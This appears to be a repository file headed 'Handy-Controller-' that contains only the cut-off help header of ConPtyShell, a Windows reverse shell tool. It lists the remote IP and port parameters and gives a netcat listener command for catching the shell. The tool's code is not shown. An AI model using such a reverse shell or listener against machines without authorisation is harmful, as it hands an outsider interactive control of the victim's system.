# Handy-Controller-
{   
    <#
        .SYNOPSIS
            ConPtyShell - Fully Interactive Reverse Shell for Windows 
            Author: splinter_code
            License: MIT
            Source: https://github.com/antonioCoco/ConPtyShell
        
        .DESCRIPTION
            ConPtyShell - Fully interactive reverse shell for Windows
            
            Properly set the rows and cols values. You can retrieve it from
            your terminal with the command "stty size".
            
            You can avoid to set rows and cols values if you run your listener
            with the following command:
                stty raw -echo; (stty size; cat) | nc -lvnp 3001
           
            If you want to change the console size directly from powershell
            you can paste the following commands:
                $width=80
                $height=24
                $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height)
                $Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList ($width, $height)
            
            
        .PARAMETER RemoteIp
            The remote ip to connect
        .PARAMETER RemotePort
            The remote port to connect
        .PARAMETER Rows
            Rows size for the console
            Default: "24"
        .PARAMETER Cols
            Cols size for the console
            Default: "80"
        .PARAMETER CommandLine
            The commandline of the process that you are going to interact
            Default: "powershell.exe"
